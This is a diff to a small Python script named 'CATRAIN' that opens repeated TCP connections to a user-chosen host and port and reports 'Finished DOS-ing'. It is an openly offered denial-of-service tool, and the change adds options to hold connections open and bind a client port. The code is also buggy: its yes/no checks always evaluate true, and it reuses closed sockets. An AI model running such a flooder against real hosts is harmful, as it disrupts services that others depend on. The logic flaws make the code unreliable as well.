@@ -13,22 +13,58 @@ print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<");
 
 
 from socket import socket,AF_INET,SOCK_STREAM#; p = ""; import datetime 
-try: ip = input("Server hostname or IP:\tdefault: ::\t> ") or "127.0.0.1"; count = input("Count:\t\t\tdefault:  3\t> ") or 3 
-except Exception as e: input(("Exception raised:", e)) 
-port = input("\tPort:\t\tdefault: 80\t> ") or "80"   
-input(f"\nINFO:\n - Connect to '{ip}' on port '{port}'\nContinue? ^C to cancel > ") # type: ignore 
+bool_bind = True; bool_close = bool; bind_port = int
+try: 
+    ip = input("Server hostname or IP:\tdefault: ::\t> ") or "127.0.0.1" 
+    port = input("\tPort:\t\tdefault: 80\t> ") or "80" 
+    count = input("Count:\t\t\tdefault:  3\t> ") or 3 
+    if (input("Close connections automatically? (yes/y/no/n) (default: yes)> ").lower() == 'no' or 'n') == True: 
+        bool_close = False 
+    else: 
+        bool_close = True 
+    if (input("Limit to one port client side? (yes/y/no/n) (default: yes) > ").lower() == 'no' or 'n' == True): 
+        bool_bind = False; 
+    else: 
+        temp = input("Port to bind to (default: 8000) > ") 
+        if temp != '':
+            bind_port = int(temp) 
+        else: bind_port = 8000 
+    if bool_bind == True: 
+        input(f"\nINFO:\n - Connect to '{ip}' on port '{port}'\nClose ports:\t\t\t{bool_close}\nBind to port clientside:\t{bool_bind}\t& port:{bind_port}\nContinue? ^C to cancel > ") 
+    else: 
+        input(f"\nINFO:\n - Connect to '{ip}' on port '{port}'\nClose connections:\t\t\t{bool_close}\nBind to port clientside:\t{bool_bind}\nContinue? ^C to cancel > ") 
+except KeyboardInterrupt: print("\nKeyboardInterrupt: Process cancelled.\n"); exit() 
 
 ec = 0
-if port != "" or None:
-    for i in range(int(count)): # type: ignore 
-        #AF_INET is for IPv4 - SOCK_STREAM is for TCP 
-        sock = socket(AF_INET, SOCK_STREAM) 
-        try: sock.connect((ip, int(port))); sock.close(); print("CONN/DISC no. ", i+1)  # type: ignore 
-        except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1 
+if port != "" or None: 
+    if bool_bind == False:
+        for i in range(int(count)):  
+            #AF_INET is for IPv4 - SOCK_STREAM is for TCP 
+            sock = socket(AF_INET, SOCK_STREAM) 
+            try: sock.connect((ip, int(port))); 
+            except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1; sock.close() 
+            if bool_close == True: sock.close() 
+            print("CONN/DISC no. ", i+1) 
+    else: 
+        sock = socket(AF_INET, SOCK_STREAM); sock.bind(("127.0.0.1", bind_port)) 
+        for i in range(int(count)):  
+            try: sock.connect((ip, int(port))); 
+            except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1; sock.close() 
+            if bool_close == True: sock.close() 
+            print("CONN/DISC no. ", i+1) 
 else:
-    for i in range(int(count)): # type: ignore 
-        #AF_INET is for IPv4 - SOCK_STREAM is for TCP 
-        sock = socket(AF_INET, SOCK_STREAM) 
-        try: sock.connect((ip)); sock.close(); print("CONN/DISC no. ", i+1)  # type: ignore 
-        except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1 
-input(f"\nFinished DOS-ing\nSTATS:\nConnections attempted:\tConnections succeded:\n{count}\t\t\t{int(count)-ec}\n") # type: ignore 
+    if bool_bind == False:
+        for i in range(int(count)):  
+            sock = socket(AF_INET, SOCK_STREAM) 
+            try: sock.connect(ip); 
+            except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1; sock.close() 
+            if bool_close == True: sock.close() 
+            print("CONN/DISC no. ", i+1) 
+    else: 
+        sock = socket(AF_INET, SOCK_STREAM); sock.bind(("127.0.0.1", bind_port)) 
+        for i in range(int(count)):  
+            try: sock.connect(ip); 
+            except Exception as e: print("CONN/DISC no. ", i+1, "\tfailed: ", e); ec += 1; sock.close() 
+            if bool_close == True: sock.close() 
+            print("CONN/DISC no. ", i+1) 
+input(f"\n~Finished DOS-ing~\nSTATS:\nConnections attempted:\tConnections succeded:\n{count}\t\t\t{int(count)-ec}\n") 
